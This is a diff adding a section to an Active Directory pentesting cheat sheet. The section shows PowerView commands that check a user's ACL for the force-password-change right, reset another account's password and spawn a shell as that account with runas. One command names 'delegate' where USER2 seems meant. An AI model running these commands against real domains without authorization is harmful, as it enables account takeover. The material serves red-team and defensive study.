@@ -312,6 +312,21 @@ Interestig to see the chance to change password for USER3
 ```powershell
 C:> Get-ObjectAcl -SamAccountName USER -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
 ```
+#### Check if USER can Force Password Change on USER2
+Usefull to change user password
+```powerview
+C:> Get-ObjectAcl -SamAccountName USER2 -ResolveGUIDs | ? {$_.IdentityReference -eq "DOMAIN\USER"}
+```
+If The USER2 has the `User-Force-Change-Password` in the ObjectType property for USER on it's ACL, password can be changed
+```powerview
+C:> Set-DomainUserPassword -Identity delegate -Verbose
+C:> runas /user:DOMAIN\USER2 cmd
+[Asks for a password and then spawns the shell] 
+```
+Also password can be changed like this
+```powerview
+C:> Set-DomainUserPassword -Identity USER2 -AccountPassword (ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force) -Verbose
+```
 ### Domain Trusts Enumeration
 ---
 #### Enumerate Domain Trust Relationships of the Current User
